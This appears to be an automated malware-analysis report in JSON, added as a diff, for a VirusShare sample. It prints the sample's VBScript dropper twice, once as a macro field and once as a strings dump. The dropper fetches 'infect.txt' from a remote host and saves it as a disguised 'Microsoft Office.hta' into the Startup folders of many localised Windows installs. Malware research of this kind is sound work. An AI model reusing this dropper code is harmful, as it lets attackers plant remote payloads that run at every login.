@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Open": "May open a file"
+        },
+        "macro": "on error resume next\nDim Conn, rs\nSet Conn = CreateObject(\"ADODB.Connection\")\nConn.Open \"Driver={Microsoft Text Driver (*.txt; *.csv)};\" & \"Dbq=www.temphost.ws;\" & \"Extensions=asc,csv,tab,txt;\" & \"Persist Security Info=False\"\nDim sql\nsql = \"SELECT * from infect.txt\"\nset rs = conn.execute(sql)\nset rs =CreateObject(\"ADODB.recordset\")\nrs.Open \"SELECT * from infect.txt\", conn\nrs.Save \"C:\\ms.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Menu Inicio\\Programas\\Inicio\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Menu D\ufffdmarrer\\Programmes\\D\ufffdmarrageMicrosoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Menuen Start\\Programmer\\Start\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Menu Start\\Programma's\\Opstarten\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Menu Start\\Programy\\Autostart\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Menu Avvio\\Programmi\\Esecuzione automatica\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Kaynnista-valikko\\Ohjelmat\\Kaynnistys\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Start Menu\\Programlar\\BASLANGIC\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Start-meny\\Programmer\\Oppstart\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Start-menyn\\Program\\Autostart\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Iniciar\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Dokumente und Einstellungen\\All Users\\Startmenu\\Programme\\Autostart\\Microsoft Office.hta\", adPersistXML\nrs.Save \"C:\\Documents and Settings\\All Users\\\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\\\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\\Microsoft Office.hta\", adPersistXML\nrs.close\nconn.close"
+    },
+    "filename": "VirusShare_008b444c80069a6a9b50dbd435676b14",
+    "filesize": 2058,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "008b444c80069a6a9b50dbd435676b14",
+        "sha1": "920c0eb5f1b663bd682f7f976804941537498522",
+        "sha256": "d6d693009a114c45d91a4e6af817fc4d84c26606c26a3df11a7cbc9fdb6e1f48"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "on error resume next",
+            "Dim Conn, rs",
+            "Set Conn = CreateObject(\"ADODB.Connection\")",
+            "Conn.Open \"Driver={Microsoft Text Driver (*.txt; *.csv)};\" & _",
+            "\"Dbq=www.temphost.ws;\" & _",
+            "\"Extensions=asc,csv,tab,txt;\" & _",
+            "\"Persist Security Info=False\"",
+            "Dim sql",
+            "sql = \"SELECT * from infect.txt\"",
+            "set rs = conn.execute(sql)",
+            "set rs =CreateObject(\"ADODB.recordset\")",
+            "rs.Open \"SELECT * from infect.txt\", conn",
+            "rs.Save \"C:\\ms.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Menu Inicio\\Programas\\Inicio\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Menu Dmarrer\\Programmes\\DmarrageMicrosoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Menuen Start\\Programmer\\Start\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Menu Start\\Programma's\\Opstarten\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Menu Start\\Programy\\Autostart\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Menu Avvio\\Programmi\\Esecuzione automatica\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Kaynnista-valikko\\Ohjelmat\\Kaynnistys\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Start Menu\\Programlar\\BASLANGIC\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Start-meny\\Programmer\\Oppstart\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Start-menyn\\Program\\Autostart\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\Menu Iniciar\\Programas\\Iniciar\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Dokumente und Einstellungen\\All Users\\Startmenu\\Programme\\Autostart\\Microsoft Office.hta\", adPersistXML",
+            "rs.Save \"C:\\Documents and Settings\\All Users\\ \\\\\\Microsoft Office.hta\", adPersistXML",
+            "rs.close",
+            "conn.close"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.274456",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
